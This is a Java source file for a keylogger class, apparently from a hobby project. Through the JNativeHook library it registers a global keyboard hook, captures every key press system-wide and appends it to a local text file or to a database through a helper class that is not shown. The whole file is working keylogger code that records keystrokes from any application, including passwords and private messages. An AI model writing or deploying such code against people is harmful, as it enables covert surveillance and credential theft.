package ch.fxlogger.fxkeylogger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;


public class KeyLogger implements NativeKeyListener {

    private static final Path file = Paths.get("src/main/java/ch/fxlogger/fxkeylogger/keys.txt");

    private static String log = "";
    private boolean st, ctrl, alt, capslock;

    private int writingInWhat = 0;

    /**
     *
     * @param what
     * 0 is logging into a file
     * 1 is logging into a database
     */

    public void setLogInWhat(final int what){
        this.writingInWhat = what;
    }

    public void run() {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.exit(1);
        }
        GlobalScreen.addNativeKeyListener(new KeyLogger());
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {

        String keyText = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());

        try (
                OutputStream os = Files.newOutputStream(
                file,
                StandardOpenOption.CREATE,
                StandardOpenOption.WRITE,
                StandardOpenOption.APPEND);
             PrintWriter writer = new PrintWriter(os)) {
            if (keyText.length() > 1) {
                log = log + "[" + keyText + "]";
                //writer.print("[" + keyText + "]");

            } else {
                log = log + keyText;
                //writer.print(keyText);
            }

            if(writingInWhat == 0){
                writer.print(log);
            }
            else if(writingInWhat == 1){
                SQLDatabaseConnection sqlDatabaseConnection = new SQLDatabaseConnection();
                sqlDatabaseConnection.connect();
                sqlDatabaseConnection.createTable();
                sqlDatabaseConnection.writeIntoDatabase(log);
            }
        } catch (IOException e) {
            System.exit(-1);
        }




    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }
}
